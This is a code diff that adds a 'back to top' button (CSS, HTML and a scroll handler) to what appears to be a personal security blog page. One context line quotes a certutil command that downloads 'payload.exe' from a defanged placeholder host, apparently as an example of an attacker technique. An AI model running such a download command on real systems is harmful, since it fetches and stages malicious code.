@@ -171,6 +171,30 @@
 }
   .back-link{display:inline-block; margin-bottom:24px; font-size:14px;}
 
+  #back-to-top{
+    position: fixed;
+    bottom: 28px;
+    right: 28px;
+    background: var(--bg-soft);
+    border: 1px solid var(--line);
+    color: var(--accent);
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    font-size: 18px;
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.4);
+    transition: opacity 0.2s;
+    z-index: 50;
+  }
+  #back-to-top:hover{
+    border-color: var(--accent-dim);
+  }
+
   @media (max-width:600px){
     header{padding:40px 0 24px;}
     header h1{font-size:24px;}
@@ -220,6 +244,8 @@
     <span>© 2026 0x52</span>
     <span>github.com/Romanzeb</span>  
   </footer>
+
+  <button id="back-to-top" onclick="window.scrollTo({top:0, behavior:'smooth'})" title="Yukarı çık">↑</button>
 </div>
 
 <script>
@@ -357,6 +383,11 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
   const aboutEl = document.getElementById('about');
   const navPosts = document.getElementById('nav-posts');
   const navAbout = document.getElementById('nav-about');
+  const backToTop = document.getElementById('back-to-top');
+
+  window.addEventListener('scroll', () => {
+    backToTop.style.display = window.scrollY > 400 ? 'flex' : 'none';
+  });
 
   function renderList(){
     listEl.innerHTML = posts.map(p => `
